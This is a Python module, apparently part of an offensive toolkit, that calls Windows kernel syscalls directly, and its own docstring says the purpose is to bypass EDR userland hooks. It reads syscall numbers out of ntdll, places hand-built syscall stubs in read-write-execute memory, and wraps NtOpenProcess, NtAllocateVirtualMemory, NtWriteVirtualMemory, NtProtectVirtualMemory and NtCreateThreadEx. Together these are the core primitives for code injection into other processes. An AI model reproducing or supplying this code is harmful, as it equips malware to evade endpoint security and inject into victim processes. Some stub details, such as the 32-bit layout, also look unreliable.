"""Direct syscall invocation — bypasses EDR userland hooks via raw kernel syscalls."""
import ctypes
import os
from ctypes import wintypes

NTSTATUS = ctypes.c_long
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

_is_x64 = ctypes.sizeof(ctypes.c_void_p) == 8
_STUB = (
    bytes([0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3])
    if _is_x64 else
    bytes([0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x34, 0xC3])
)
_SSN_OFF = 4


def _resolve_ssn(name):
    """Extract the syscall number from the ntdll.dll function stub."""
    if os.name != 'nt':
        return 0
    k32 = ctypes.windll.kernel32
    addr = k32.GetProcAddress(ctypes.windll.ntdll._handle, name.encode())
    if not addr:
        raise OSError(f"Syscall {name} not found in ntdll.dll")
    raw = (ctypes.c_ubyte * 4).from_address(addr + _SSN_OFF)
    return raw[0] | (raw[1] << 8)


def _make_stub(ssn):
    """Allocate executable memory containing a direct-syscall stub for the given SSN."""
    if os.name != 'nt':
        return None
    k32 = ctypes.windll.kernel32
    stub = bytearray(_STUB)
    stub[_SSN_OFF] = ssn & 0xFF
    stub[_SSN_OFF + 1] = (ssn >> 8) & 0xFF
    size = len(stub)
    addr = k32.VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    ctypes.memmove(addr, bytes(stub), size)
    return addr


def resolve_syscall(name):
    """Resolve a syscall number by function name from ntdll.dll. Returns int or None."""
    if os.name != 'nt':
        return None
    try:
        return _resolve_ssn(name)
    except OSError:
        return None


def syscall_NtAllocateVirtualMemory(handle, base_addr, zero_bits, region_size,
                                    alloc_type, protect):
    """Direct NtAllocateVirtualMemory via syscall stub. Returns NTSTATUS."""
    if os.name != 'nt':
        return None
    ssn = _resolve_ssn('NtAllocateVirtualMemory')
    proto = ctypes.CFUNCTYPE(
        NTSTATUS, wintypes.HANDLE, ctypes.POINTER(ctypes.c_void_p), ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_size_t), wintypes.ULONG, wintypes.ULONG,
    )
    return proto(_make_stub(ssn))(handle, base_addr, zero_bits, region_size,
                                  alloc_type, protect)


def syscall_NtWriteVirtualMemory(handle, addr, buf, size, bytes_written):
    """Direct NtWriteVirtualMemory via syscall stub. Returns NTSTATUS."""
    if os.name != 'nt':
        return None
    ssn = _resolve_ssn('NtWriteVirtualMemory')
    proto = ctypes.CFUNCTYPE(
        NTSTATUS, wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_size_t),
    )
    return proto(_make_stub(ssn))(handle, addr, buf, size, bytes_written)


def syscall_NtCreateThreadEx(thread_handle, desired_access, obj_attr,
                             process_handle, start_addr, param, create_flags,
                             zero_bits, stack_size, max_stack_size, attr_list):
    """Direct NtCreateThreadEx via syscall stub. Returns NTSTATUS."""
    if os.name != 'nt':
        return None
    ssn = _resolve_ssn('NtCreateThreadEx')
    proto = ctypes.CFUNCTYPE(
        NTSTATUS, ctypes.POINTER(wintypes.HANDLE), wintypes.DWORD, ctypes.c_void_p,
        wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD,
        wintypes.DWORD, ctypes.c_size_t, ctypes.c_size_t, ctypes.c_void_p,
    )
    return proto(_make_stub(ssn))(thread_handle, desired_access, obj_attr,
                                  process_handle, start_addr, param, create_flags,
                                  zero_bits, stack_size, max_stack_size, attr_list)


def syscall_NtProtectVirtualMemory(handle, addr, size, new_protect, old_protect):
    """Direct NtProtectVirtualMemory via syscall stub. Returns NTSTATUS."""
    if os.name != 'nt':
        return None
    ssn = _resolve_ssn('NtProtectVirtualMemory')
    proto = ctypes.CFUNCTYPE(
        NTSTATUS, wintypes.HANDLE, ctypes.POINTER(ctypes.c_void_p),
        ctypes.POINTER(ctypes.c_size_t), wintypes.ULONG,
        ctypes.POINTER(wintypes.ULONG),
    )
    return proto(_make_stub(ssn))(handle, addr, size, new_protect, old_protect)


def syscall_NtOpenProcess(handle, desired_access, obj_attr, client_id):
    """Direct NtOpenProcess via syscall stub. Returns NTSTATUS."""
    if os.name != 'nt':
        return None
    ssn = _resolve_ssn('NtOpenProcess')
    proto = ctypes.CFUNCTYPE(
        NTSTATUS, ctypes.POINTER(wintypes.HANDLE), wintypes.DWORD,
        ctypes.c_void_p, ctypes.c_void_p,
    )
    return proto(_make_stub(ssn))(handle, desired_access, obj_attr, client_id)
